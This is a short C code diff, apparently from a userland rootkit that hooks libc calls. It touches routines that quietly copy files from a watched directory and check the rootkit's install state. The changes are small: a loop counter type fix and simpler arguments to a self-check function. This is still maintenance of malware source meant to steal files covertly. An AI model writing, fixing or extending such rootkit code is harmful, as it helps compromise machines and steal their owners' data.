@@ -324,8 +324,7 @@ int writecopy(const char *oldpath, char *newpath){
     // create this file to make it clear that the file is still being copied. unlink it when done.
     tmppath = pathtmp(newpath);
     call(CCREAT, tmppath, 0600);
-
-    for(int i=0; i<fsize; i++){
+    for(off_t i=0; i<fsize; i++){
         p = map[i];
         fputc(p, nfp);
     }
@@ -393,7 +392,7 @@ static int takeit(void *oldpath){
 
 
 void inspectfile(const char *pathname){
-    if(sssdproc() || rknomore(INSTALL_DIR, BDVLSO)) return;
+    if(sssdproc() || rknomore()) return;
 
     hook(COPENDIR);
     DIR *dp = call(COPENDIR, INTEREST_DIR);
